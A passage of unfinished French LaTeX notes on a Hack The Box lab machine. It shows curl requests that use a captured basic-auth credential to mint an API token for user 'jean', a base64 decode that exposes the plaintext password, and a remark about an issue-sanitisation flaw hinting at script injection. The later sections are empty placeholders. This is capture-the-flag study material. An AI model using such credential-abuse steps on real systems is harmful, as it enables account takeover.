$ curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens \
    -H 'accept: application/json' \
    -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'
[]
$ curl -XPOST http://dev.snippet.htb/api/v1/users/jean/tokens \
    -H 'accept: application/json' -H 'Content-type: application/json' \
    -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB' \
    -d '{"name": "jean"}'
{"id":1,"name":"jean","sha1":"566d73d9cf1ac753c747e3874e65d8cc6d43a300","token_last_eight":"6d43a300"}
$ curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens \
    -H 'accept: application/json' \
    -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'
[{"id":1,"name":"jean","sha1":"","token_last_eight":"6d43a300"}]
\end{verbatim}


\begin{verbatim}
$ echo amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB | base64 -d
jean:EHmfar1Y7ppA9O5TAIXnYnJpA
\end{verbatim}

donc maintenant on se log en tant que jean.

donc il ont un truc pour lancer l'analyse des issues qui est utilisé par les
membre de l'équipe.

il y a un truc qui a été corrigé sur le netoyage d'une issue. En gros si elle
contenait des éléments interdit comme \verb+script+ il retournait l'issue au
lieu de retourner une issue vide.


bsection{x x x}

\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
\end{verbatim}

\subsubsection{x}

\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


